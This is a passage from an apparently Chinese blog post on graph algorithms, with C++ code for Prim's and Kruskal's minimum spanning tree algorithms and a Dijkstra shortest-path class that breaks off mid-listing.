http://blog.csdn.net/luoshixian099算法导论--最小生成树（Prim、Kruskal）2016年7月14日</span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITE 0xFFFFFFFF   </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VertexData unsigned int  <span class="comment">//顶点数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UINT  unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vexCounts 6  <span class="comment">//顶点数量</span></span></span><br><span class="line"><span class="type">char</span> vextex[] = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VertexData data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> lowestcost;</span><br><span class="line">&#125;closedge[vexCounts]; <span class="comment">//Prim算法中的辅助信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VertexData u;</span><br><span class="line">    VertexData v;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> cost;  <span class="comment">//边的代价</span></span><br><span class="line">&#125;Arc;  <span class="comment">//原始图的边信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">AdjMatrix</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts])</span>  <span class="comment">//邻接矩阵表示法</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts; i++)   <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; vexCounts; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            adjMat[i][j] = INFINITE;</span><br><span class="line">        &#125;</span><br><span class="line">    adjMat[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">6</span>; adjMat[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">1</span>; adjMat[<span class="number">0</span>][<span class="number">3</span>] = <span class="number">5</span>;</span><br><span class="line">    adjMat[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">6</span>; adjMat[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">5</span>; adjMat[<span class="number">1</span>][<span class="number">4</span>] = <span class="number">3</span>;</span><br><span class="line">    adjMat[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">1</span>; adjMat[<span class="number">2</span>][<span class="number">1</span>] = <span class="number">5</span>; adjMat[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">5</span>; adjMat[<span class="number">2</span>][<span class="number">4</span>] = <span class="number">6</span>; adjMat[<span class="number">2</span>][<span class="number">5</span>] = <span class="number">4</span>;</span><br><span class="line">    adjMat[<span class="number">3</span>][<span class="number">0</span>] = <span class="number">5</span>; adjMat[<span class="number">3</span>][<span class="number">2</span>] = <span class="number">5</span>; adjMat[<span class="number">3</span>][<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">    adjMat[<span class="number">4</span>][<span class="number">1</span>] = <span class="number">3</span>; adjMat[<span class="number">4</span>][<span class="number">2</span>] = <span class="number">6</span>; adjMat[<span class="number">4</span>][<span class="number">5</span>] = <span class="number">6</span>;</span><br><span class="line">    adjMat[<span class="number">5</span>][<span class="number">2</span>] = <span class="number">4</span>; adjMat[<span class="number">5</span>][<span class="number">3</span>] = <span class="number">2</span>; adjMat[<span class="number">5</span>][<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Minmum</span><span class="params">(<span class="keyword">struct</span> node * closedge)</span>  <span class="comment">//返回最小代价边</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> min = INFINITE;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (closedge[i].lowestcost &lt; min &amp;&amp; closedge[i].lowestcost !=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            min = closedge[i].lowestcost;</span><br><span class="line">            index = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MiniSpanTree_Prim</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts], VertexData s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        closedge[i].lowestcost = INFINITE;</span><br><span class="line">    &#125;      </span><br><span class="line">    closedge[s].data = s;      <span class="comment">//从顶点s开始</span></span><br><span class="line">    closedge[s].lowestcost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)  <span class="comment">//初始化辅助数组</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != s)</span><br><span class="line">        &#123;</span><br><span class="line">            closedge[i].data = s;</span><br><span class="line">            closedge[i].lowestcost = adjMat[s][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> e = <span class="number">1</span>; e &lt;= vexCounts <span class="number">-1</span>; e++)  <span class="comment">//n-1条边时退出</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> k = Minmum(closedge);  <span class="comment">//选择最小代价边</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; vextex[closedge[k].data] &lt;&lt; <span class="string">&quot;--&quot;</span> &lt;&lt; vextex[k] &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//加入到最小生成树</span></span><br><span class="line">        closedge[k].lowestcost = <span class="number">0</span>; <span class="comment">//代价置为0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)  <span class="comment">//更新v中顶点最小代价边信息</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( adjMat[k][i] &lt; closedge[i].lowestcost)</span><br><span class="line">            &#123;</span><br><span class="line">                closedge[i].data = k;</span><br><span class="line">                closedge[i].lowestcost = adjMat[k][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadArc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>  adjMat[][vexCounts],<span class="built_in">vector</span>&lt;Arc&gt; &amp;vertexArc)</span> <span class="comment">//保存图的边代价信息</span></span><br><span class="line">&#123;</span><br><span class="line">    Arc * temp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (adjMat[i][j]!=INFINITE)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = new Arc;</span><br><span class="line">                temp-&gt;u = i;</span><br><span class="line">                temp-&gt;v = j;</span><br><span class="line">                temp-&gt;cost = adjMat[i][j];</span><br><span class="line">                vertexArc.push_back(*temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">compare</span><span class="params">(Arc  A, Arc  B)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> A.cost &lt; B.cost ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">FindTree</span><span class="params">(VertexData u, VertexData v,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;VertexData&gt; &gt; &amp;Tree)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index_u = INFINITE;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index_v = INFINITE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; Tree.size();i++)  <span class="comment">//检查u,v分别属于哪颗树</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (find(Tree[i].begin(), Tree[i].end(), u) != Tree[i].end())</span><br><span class="line">            index_u = i;</span><br><span class="line">        <span class="keyword">if</span> (find(Tree[i].begin(), Tree[i].end(), v) != Tree[i].end())</span><br><span class="line">            index_v = i;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (index_u != index_v)   <span class="comment">//u,v不在一颗树上，合并两颗树</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; Tree[index_v].size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Tree[index_u].push_back(Tree[index_v][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Tree[index_v].clear();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MiniSpanTree_Kruskal</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> adjMat[][vexCounts])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;Arc&gt; vertexArc;</span><br><span class="line">    ReadArc(adjMat, vertexArc);<span class="comment">//读取边信息</span></span><br><span class="line">    sort(vertexArc.begin(), vertexArc.end(), compare);<span class="comment">//边按从小到大排序</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;VertexData&gt; &gt; Tree(vexCounts); <span class="comment">//6棵独立树</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vexCounts; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Tree[i].push_back(i);  <span class="comment">//初始化6棵独立树的信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; vertexArc.size(); i++)<span class="comment">//依次从小到大取最小代价边</span></span><br><span class="line">    &#123;</span><br><span class="line">        VertexData u = vertexArc[i].u;  </span><br><span class="line">        VertexData v = vertexArc[i].v;</span><br><span class="line">        <span class="keyword">if</span> (FindTree(u, v, Tree))<span class="comment">//检查此边的两个顶点是否在一颗树内</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; vextex[u] &lt;&lt; <span class="string">&quot;---&quot;</span> &lt;&lt; vextex[v] &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//把此边加入到最小生成树中</span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  adjMat[vexCounts][vexCounts] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    AdjMatrix(adjMat);   <span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prim :&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    MiniSpanTree_Prim(adjMat,<span class="number">0</span>); <span class="comment">//Prim算法，从顶点0开始.</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;Kruskal:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    MiniSpanTree_Kruskal(adjMat);<span class="comment">//Kruskal算法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dijkstra算法求单源最短路径问题"><a class="markdownIt-Anchor" href="#dijkstra算法求单源最短路径问题">#</a> Dijkstra 算法 (求单源最短路径问题)</h2><h3 id="算法原理"><a class="markdownIt-Anchor" href="#算法原理">#</a> 算法原理</h3><ul><li>适合求解有回路的带权图的最短路径</li><li>可以求任意两个顶点的最短路径</li><li>不适合求带负权值的最短路径问题</li></ul><p><a href="https://blog.csdn.net/Cy_coding/article/details/106165911?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448321716780269836468%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448321716780269836468&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-106165911.first_rank_v2_pc_rank_v29&amp;utm_term=%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">具体解释</a><br><img src="https://img-blog.csdnimg.cn/c46fae4b34194554aa228dcec3e7ba76.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="邻接矩阵实现"><a class="markdownIt-Anchor" href="#邻接矩阵实现">#</a> 邻接矩阵实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用邻接矩阵构建有向图</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 999<span class="comment">//表示无穷</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MVNum 20<span class="comment">//最大结点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> VertexType;<span class="comment">//设置结点的数据类型为int型（方便后续修改成char...）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ArcType;<span class="comment">//设置的权值为int型（方便后续修改成float...）</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graph</span>//<span class="title">Adjacency</span> <span class="title">Matrix</span> <span class="title">Graph</span>有向图，用邻接矩阵表示</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">Create</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateVex</span><span class="params">(VertexType u)</span>;<span class="comment">//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">firstadj</span><span class="params">(<span class="type">int</span> v)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">nextadj</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(VertexType start_point)</span>;<span class="comment">//使用迪杰斯特拉算法打印单源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show</span><span class="params">()</span>;<span class="comment">//调试用，打印邻接矩阵</span></span><br><span class="line">private:</span><br><span class="line">VertexType vexs[MVNum];<span class="comment">//顶点表,将顶点保存的信息存入此处</span></span><br><span class="line">ArcType arcs[MVNum][MVNum];<span class="comment">//邻接矩阵</span></span><br><span class="line"><span class="type">int</span> vexnum, arcnum;<span class="comment">//图当前的顶点数和边数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">queue</span>&lt;VertexType&gt;&gt;path;<span class="comment">//保存各结点最短路径的path[i]</span></span><br><span class="line">ArcType dist[MVNum];<span class="comment">//最短路径大小</span></span><br><span class="line"><span class="type">bool</span> solved[MVNum];<span class="comment">//是否找到最短路径</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::LocateVex</span><span class="params">(VertexType u)</span></span><br><span class="line">&#123;<span class="comment">//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (u == this-&gt;vexs[i])</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::firstadj</span><span class="params">(<span class="type">int</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[v][i] != MAX)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::nextadj</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = w + <span class="number">1</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[v][i] != MAX)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setw(<span class="number">4</span>) &lt;&lt; this-&gt;arcs[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入总结点数和总边数:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; this-&gt;vexnum &gt;&gt; this-&gt;arcnum;<span class="comment">//输入总顶点数和总边数</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入各结点的信息:&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; this-&gt;vexs[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化邻接矩阵</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;arcs[i][j] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//构造邻接矩阵</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;arcnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v1, v2, w;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;条边的起点和终点及其对应的权值:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;</span><br><span class="line"><span class="type">int</span> m = LocateVex(v1);</span><br><span class="line"><span class="type">int</span> n = LocateVex(v2);</span><br><span class="line">this-&gt;arcs[m][n] = w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Dijkstra</span><span class="params">(VertexType start_point)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//初始化最短距离数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;dist[i] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">dist[this-&gt;LocateVex(start_point)] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//初始化保存路径的向量</span></span><br><span class="line"><span class="built_in">queue</span>&lt;VertexType&gt;temp;</span><br><span class="line">temp.push(start_point);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//（移到for外）queue&lt;VertexType&gt;temp;</span></span><br><span class="line"><span class="comment">//temp.push(start_point);</span></span><br><span class="line">path.push_back(temp);</span><br><span class="line"><span class="comment">//（不可行）path[i].push(start_point);//将起点作为最初始的路径加入每个结点对应的队列中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化solved数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">solved[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[this-&gt;LocateVex(start_point)][i] != MAX)</span><br><span class="line">&#123;</span><br><span class="line">dist[i] = this-&gt;arcs[this-&gt;LocateVex(start_point)][i];</span><br><span class="line">path[i].push(this-&gt;vexs[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">solved[this-&gt;LocateVex(start_point)] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;<span class="comment">//返回地找</span></span><br><span class="line">ArcType mind = MAX;</span><br><span class="line"><span class="type">int</span> v = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;<span class="comment">//一个劲地往前走</span></span><br><span class="line"><span class="comment">//（移出for）int v = i;</span></span><br><span class="line"><span class="keyword">if</span> (!solved[j] &amp;&amp; dist[j] &lt; mind)</span><br><span class="line">&#123;</span><br><span class="line">mind = dist[j];</span><br><span class="line">v = j;</span><br><span class="line">&#125;</span><br><span class="line">solved[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="type">int</span> w = this-&gt;firstadj(v);</span><br><span class="line"><span class="keyword">while</span> (w != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dist[v] + this-&gt;arcs[v][w] &lt; dist[w])</span><br><span 